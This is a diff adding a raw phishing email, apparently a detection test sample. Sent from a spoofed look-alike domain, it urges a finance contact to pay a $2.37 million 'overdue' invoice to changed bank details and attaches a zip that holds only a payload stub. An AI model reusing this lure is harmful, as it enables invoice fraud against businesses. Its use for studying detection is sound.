@@ -1,0 +1,78 @@
+From: "Bluestone Partners Accounts" <billing@sbi-netbanking-kyc.top>
+To: Sanjay Kapoor <sanjay.kapoor@northgate-industries.com>
+Subject: Remittance advice INV-2026-2165 - action required
+Date: Tue, 26 May 2026 12:25:00 +0000
+Message-ID: <178772093943.6.18205330987302348308@sbi-netbanking-kyc.top>
+Return-Path: <bounce-9255@sbi-netbanking-kyc.top>
+MIME-Version: 1.0
+X-Mailer: PHPMailer 6.1.6
+Received: from edge-2.mailcluster.example (edge-2.mailcluster.example
+ [203.0.113.61]) by mx.northgate-industries.com (Postfix) with ESMTPS id
+ 963F8685353E for <recipient@northgate-industries.com>; Tue, 26 May 2026
+ 12:25:00 +0000
+Received: from compute-04.cloudprovider.example
+ (compute-04.cloudprovider.example [198.51.100.150]) by
+ edge-2.mailcluster.example (Postfix) with ESMTPS id 0786358B7875; Tue, 26 May
+ 2026 12:18:40 +0000
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ compute-04.cloudprovider.example (Postfix) with ESMTPS id EC9D2611DA0D; Tue,
+ 26 May 2026 12:18:31 +0000
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ mx1.mail-relay.example (Postfix) with ESMTPS id 25716084DF66; Tue, 26 May
+ 2026 12:14:29 +0000
+Received: from mail.gateway.example (mail.gateway.example [203.0.113.5]) by
+ smtp-out-3.example (Postfix) with ESMTPS id 7908E3F68C9C; Tue, 26 May 2026
+ 12:10:49 +0000
+Received-SPF: fail (mailfrom) identity=mailfrom; client-ip=192.0.2.10;
+ envelope-from=<bounce@sbi-netbanking-kyc.top>;
+Authentication-Results: mx.sbi-netbanking-kyc.top; spf=fail
+ smtp.mailfrom=sbi-netbanking-kyc.top; dkim=none
+ header.d=sbi-netbanking-kyc.top; dmarc=fail (p=reject)
+ header.from=sbi-netbanking-kyc.top
+Content-Type: multipart/mixed; boundary="===============3732203927911508487=="
+
+--===============3732203927911508487==
+Content-Type: multipart/alternative;
+ boundary="===============8038017025794822720=="
+
+--===============8038017025794822720==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Hello Sanjay,
+
+Please find attached invoice INV-2026-2165 for $2,367,000, now overdue. Kindly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Priya Carter
+Accounts Receivable, Bluestone Partners
+
+--===============8038017025794822720==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Sanjay,</p><p>Please find attached invoice INV-2026-2165=
+ for $2,367,000, now overdue. Kindly review the attached statement and proces=
+s this payment immediately to avoid service interruption.</p><p>If the bank d=
+etails have changed since your last remittance, use the updated account infor=
+mation in the attachment.</p><p>Regards, Priya Carter Accounts Receivable, Bl=
+uestone Partners</p></body></html>
+
+--===============8038017025794822720==--
+
+--===============3732203927911508487==
+Content-Type: application/zip
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2026-2165.zip"
+MIME-Version: 1.0
+
+UEsDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcGF5bG9hZC1zdHVi
+
+--===============3732203927911508487==--
